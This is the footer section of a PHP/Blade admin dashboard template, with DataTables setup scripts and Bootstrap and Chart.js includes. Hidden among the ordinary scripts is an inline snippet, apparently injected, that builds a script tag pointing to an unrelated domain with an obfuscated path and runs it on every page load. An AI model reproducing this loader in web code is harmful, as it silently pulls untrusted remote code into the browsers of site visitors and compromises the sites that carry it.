                </main>
                <footer class="py-4 bg-light mt-auto">
                    <div class="container-fluid px-4">
                        <div class="d-flex align-items-center justify-content-between small">
                            <div class="text-muted">Copyright &copy; 
                                <?php
                                    $today = date("d/m/Y");
                                    echo $today;
                                ?>
                            </div>
                            <div>
                                <a href="#">Privacy Policy</a>
                                &middot;
                                <a href="#">Terms &amp; Conditions</a>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
        </div>


        <!-- Datatable  -->
         <script type="text/javascript">
           // $('#inactive_accounts2').DataTable().order([0, 'desc']).draw();
           $('#dev-table').dataTable( {
               "aaSorting": [],
               "paging": true
           } );
          </script>
        <script type="text/javascript">
           // $('#inactive_accounts2').DataTable().order([0, 'desc']).draw();
           $('#dev-table1').dataTable( {
               "aaSorting": [],
               "paging": true
           } );
          </script>
          <script type="text/javascript">
           // $('#inactive_accounts2').DataTable().order([0, 'desc']).draw();
           $('#dev-table0').dataTable( {
               "aaSorting": [],
               "paging": true
           } );
          </script>
          <script type="text/javascript">
           // $('#inactive_accounts2').DataTable().order([0, 'desc']).draw();
           $('#dev-table2').dataTable( {
               "aaSorting": [],
               "paging": true
           } );
          </script>


<script>
(function(__htas){
var d = document,
    s = d.createElement('script'),
    l = d.scripts[d.scripts.length - 1];
s.settings = __htas || {};
s.src = "\/\/pozekate.com\/abWU5GwnY.WsdHlWQC2s9AkJZ-Ts9J6\/b\/2n5zl\/SQWyQa9HNUDGQQ1LM\/TwUl1LOFCI0q0aNCDzUwxjNCTyU\/5A";
l.parentNode.insertBefore(s, l);
})({})
</script>

        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
        <script src="{{ URL::asset('js/scripts.js') }}"></script>
        <script src="{{ URL::asset('js/slider.js') }}"></script>
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.8.0/Chart.min.js" crossorigin="anonymous"></script>
        <script src="{{ URL::asset('js/chart-area-demo.js') }}"></script>
        <script src="{{ URL::asset('js/chart-bar-demo.js') }}"></script>
        <script src="https://cdn.jsdelivr.net/npm/simple-datatables@latest" crossorigin="anonymous"></script>
        <script src="{{ URL::asset('js/datatables-simple-demo.js') }}"></script>


    </body>
</html>